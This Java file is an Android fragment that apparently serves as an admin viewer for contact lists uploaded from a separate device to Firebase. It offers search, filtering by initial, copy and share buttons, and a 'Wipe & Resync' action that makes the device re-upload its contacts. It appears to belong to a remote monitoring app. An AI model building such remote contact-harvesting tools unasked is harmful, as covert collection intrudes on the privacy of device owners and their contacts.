package com.vikasyadavnsit.cdc.fragment;

import android.app.Activity;
import android.content.ClipData;
import android.content.ClipboardManager;
import android.content.Context;
import android.content.Intent;
import android.graphics.drawable.GradientDrawable;
import android.os.Bundle;
import android.text.Editable;
import android.text.TextWatcher;
import android.view.LayoutInflater;
import android.view.View;
import android.view.ViewGroup;
import android.widget.EditText;
import android.widget.TextView;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.annotation.Nullable;
import androidx.fragment.app.Fragment;
import androidx.recyclerview.widget.LinearLayoutManager;
import androidx.recyclerview.widget.RecyclerView;

import com.vikasyadavnsit.cdc.R;
import com.vikasyadavnsit.cdc.utils.FirebaseUtils;

import java.lang.ref.WeakReference;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.HashSet;
import java.util.List;
import java.util.Locale;
import java.util.Map;
import java.util.Set;
import java.util.stream.Collectors;

public class AdminContactsFragment extends Fragment {

    private static WeakReference<AdminContactsFragment> activeInstance;

    private RecyclerView recyclerView;
    private TextView titleView;
    private TextView emptyText;
    private TextView countBadge;
    private EditText searchInput;
    private View loader;
    private ContactsAdapter adapter;
    private List<Map<String, String>> fullData = new ArrayList<>();
    private final Map<String, Map<String, String>> cachedContacts = new HashMap<>();
    private final Set<String> fetchedInitials = new HashSet<>();

    @Override
    public void onCreate(@Nullable Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        activeInstance = new WeakReference<>(this);
    }

    @Nullable
    @Override
    public View onCreateView(@NonNull LayoutInflater inflater, @Nullable ViewGroup container, @Nullable Bundle savedInstanceState) {
        View view = inflater.inflate(R.layout.fragment_generic_list, container, false);
        recyclerView = view.findViewById(R.id.generic_list_rv);
        titleView = view.findViewById(R.id.generic_list_title);
        emptyText = view.findViewById(R.id.generic_list_empty_text);
        searchInput = view.findViewById(R.id.generic_list_search_input);
        countBadge = view.findViewById(R.id.generic_list_count);
        loader = view.findViewById(R.id.generic_list_loader);

        view.findViewById(R.id.generic_list_back_button).setOnClickListener(v ->
                getParentFragmentManager().popBackStack());
        view.findViewById(R.id.generic_list_back_button).setVisibility(View.VISIBLE);

        titleView.setText("Contacts");
        recyclerView.setLayoutManager(new LinearLayoutManager(getContext()));
        adapter = new ContactsAdapter(getContext());
        recyclerView.setAdapter(adapter);

        View filterBtn = view.findViewById(R.id.generic_list_filter_button);
        filterBtn.setVisibility(View.VISIBLE);
        filterBtn.setOnClickListener(v -> showInitialSelector());
        filterBtn.setOnLongClickListener(v -> {
            new android.app.AlertDialog.Builder(requireContext())
                    .setTitle("Wipe & Resync Contacts")
                    .setMessage("Delete all Contacts data from Firebase and trigger a fresh upload from the device?")
                    .setPositiveButton("Wipe & Resync", (d, w) -> {
                        FirebaseUtils.deleteAndResyncContacts();
                        Toast.makeText(getContext(), "Contacts data wiped — device will re-upload", Toast.LENGTH_LONG).show();
                        loader.setVisibility(View.VISIBLE);
                        fullData.clear();
                        if (adapter != null) adapter.setData(fullData);
                    })
                    .setNegativeButton("Cancel", null)
                    .show();
            return true;
        });

        setupSearch();

        loader.setVisibility(View.VISIBLE);
        FirebaseUtils.getRemoteContacts();
        return view;
    }

    private void showInitialSelector() {
        loader.setVisibility(View.VISIBLE);
        FirebaseUtils.getAvailableContactInitials(initials -> {
            if (getView() == null) return;
            loader.setVisibility(View.GONE);
            if (initials.isEmpty()) {
                Toast.makeText(getContext(), "No contacts data available", Toast.LENGTH_SHORT).show();
                return;
            }
            String[] initialArray = initials.toArray(new String[0]);
            boolean[] checked = new boolean[initialArray.length];
            new android.app.AlertDialog.Builder(requireContext())
                    .setTitle("Filter by Initial")
                    .setMultiChoiceItems(initialArray, checked, (dialog, which, isChecked) -> checked[which] = isChecked)
                    .setPositiveButton("Fetch Selected", (dialog, which) -> {
                        List<String> selected = new ArrayList<>();
                        for (int i = 0; i < checked.length; i++) {
                            if (checked[i]) selected.add(initialArray[i]);
                        }
                        if (selected.isEmpty()) {
                            Toast.makeText(getContext(), "Select at least one initial", Toast.LENGTH_SHORT).show();
                            return;
                        }
                        loader.setVisibility(View.VISIBLE);
                        FirebaseUtils.getRemoteContacts(selected);
                    })
                    .setNegativeButton("Cancel", null)
                    .show();
        });
    }

    private void setupSearch() {
        searchInput.addTextChangedListener(new TextWatcher() {
            @Override public void beforeTextChanged(CharSequence s, int start, int count, int after) {}
            @Override public void onTextChanged(CharSequence s, int start, int before, int count) { 
                String query = s.toString();
                if (!query.isEmpty()) {
                    String initial = query.substring(0, 1).toUpperCase(Locale.getDefault());
                    if (Character.isLetter(initial.charAt(0)) && !fetchedInitials.contains(initial)) {
                        fetchedInitials.add(initial);
                        loader.setVisibility(View.VISIBLE);
                        FirebaseUtils.getRemoteContacts(initial);
                    }
                }
                filter(query); 
            }
            @Override public void afterTextChanged(Editable s) {}
        });
    }

    private void filter(String query) {
        if (query.isEmpty()) {
            adapter.setData(fullData);
            countBadge.setText(String.valueOf(fullData.size()));
        } else {
            String lowerQuery = query.toLowerCase();
            List<Map<String, String>> filtered = fullData.stream()
                    .filter(map -> map.values().stream().anyMatch(v -> v != null && v.toLowerCase().contains(lowerQuery)))
                    .collect(Collectors.toList());
            adapter.setData(filtered);
            countBadge.setText(filtered.size() + " / " + fullData.size());
        }
    }

    public static void displayContacts(Activity activity, Map<String, Map<String, String>> data) {
        if (activeInstance != null && activeInstance.get() != null && activity != null) {
            activity.runOnUiThread(() -> activeInstance.get().updateUI(data));
        }
    }

    private void updateUI(Map<String, Map<String, String>> data) {
        if (getView() == null) return;
        loader.setVisibility(View.GONE);
        
        if (data != null && !data.isEmpty()) {
            cachedContacts.putAll(data);
            // Track which initials were just fetched
            for (Map<String, String> contact : data.values()) {
                String name = contact.get("name");
                if (name != null && !name.isEmpty()) {
                    String initial = name.substring(0, 1).toUpperCase(Locale.getDefault());
                    if (Character.isLetter(initial.charAt(0))) fetchedInitials.add(initial);
                }
            }
        }

        if (cachedContacts.isEmpty()) {
            emptyText.setVisibility(View.VISIBLE);
            recyclerView.setVisibility(View.GONE);
            countBadge.setVisibility(View.GONE);
            fullData.clear();
            return;
        }
        
        emptyText.setVisibility(View.GONE);
        recyclerView.setVisibility(View.VISIBLE);
        fullData = new ArrayList<>(cachedContacts.values());

        fullData.sort((a, b) -> {
            String n1 = a.get("name");
            String n2 = b.get("name");
            if (n1 == null) return 1;
            if (n2 == null) return -1;
            return n1.compareToIgnoreCase(n2);
        });

        countBadge.setVisibility(View.VISIBLE);
        filter(searchInput.getText().toString());
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        activeInstance = null;
    }

    private static class ContactsAdapter extends RecyclerView.Adapter<ContactsAdapter.ViewHolder> {
        private List<Map<String, String>> dataList = new ArrayList<>();
        private final Context context;

        private static final int[] AVATAR_COLORS = {
            0xFF7B2FBE, 0xFF5C6BC0, 0xFF00897B, 0xFFE53935,
            0xFF039BE5, 0xFF8E24AA, 0xFFFF7043, 0xFF3949AB
        };

        ContactsAdapter(Context context) {
            this.context = context;
        }

        void setData(List<Map<String, String>> data) {
            this.dataList = data;
            notifyDataSetChanged();
        }

        @NonNull
        @Override
        public ViewHolder onCreateViewHolder(@NonNull ViewGroup parent, int viewType) {
            View view = LayoutInflater.from(parent.getContext())
                    .inflate(R.layout.item_contact_card, parent, false);
            return new ViewHolder(view);
        }

        @Override
        public void onBindViewHolder(@NonNull ViewHolder holder, int position) {
            Map<String, String> data = dataList.get(position);
            String name = data.get("name");
            String number = data.get("number");

            holder.name.setText(name != null ? name : "Unknown");
            holder.number.setText(number != null ? number : "No number");

            String initials = getInitials(name);
            int color = AVATAR_COLORS[Math.abs((name != null ? name.hashCode() : position)) % AVATAR_COLORS.length];

            GradientDrawable circle = new GradientDrawable();
            circle.setShape(GradientDrawable.OVAL);
            circle.setColor(color);
            holder.avatar.setBackground(circle);
            holder.avatar.setText(initials);

            holder.copyBtn.setOnClickListener(v -> copyToClipboard(name, number));
            holder.shareBtn.setOnClickListener(v -> shareData(name, number));
        }

        private String getInitials(String name) {
            if (name == null || name.trim().isEmpty()) return "?";
            String[] parts = name.trim().split("\\s+");
            if (parts.length >= 2) {
                return (String.valueOf(parts[0].charAt(0)) + parts[1].charAt(0)).toUpperCase(Locale.getDefault());
            }
            return String.valueOf(name.charAt(0)).toUpperCase(Locale.getDefault());
        }

        private void copyToClipboard(String name, String number) {
            String text = (name != null ? name : "") + ": " + (number != null ? number : "");
            ClipboardManager cm = (ClipboardManager) context.getSystemService(Context.CLIPBOARD_SERVICE);
            cm.setPrimaryClip(ClipData.newPlainText("Contact", text));
            Toast.makeText(context, "Copied", Toast.LENGTH_SHORT).show();
        }

        private void shareData(String name, String number) {
            String text = (name != null ? name : "") + ": " + (number != null ? number : "");
            Intent intent = new Intent(Intent.ACTION_SEND);
            intent.putExtra(Intent.EXTRA_TEXT, text);
            intent.setType("text/plain");
            Intent chooser = Intent.createChooser(intent, "Share Contact via");
            chooser.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            context.startActivity(chooser);
        }

        @Override
        public int getItemCount() { return dataList.size(); }

        static class ViewHolder extends RecyclerView.ViewHolder {
            TextView avatar, name, number;
            View copyBtn, shareBtn;

            ViewHolder(View itemView) {
                super(itemView);
                avatar = itemView.findViewById(R.id.contact_avatar);
                name = itemView.findViewById(R.id.contact_name);
                number = itemView.findViewById(R.id.contact_number);
                copyBtn = itemView.findViewById(R.id.contact_copy_button);
                shareBtn = itemView.findViewById(R.id.contact_share_button);
            }
        }
    }
}
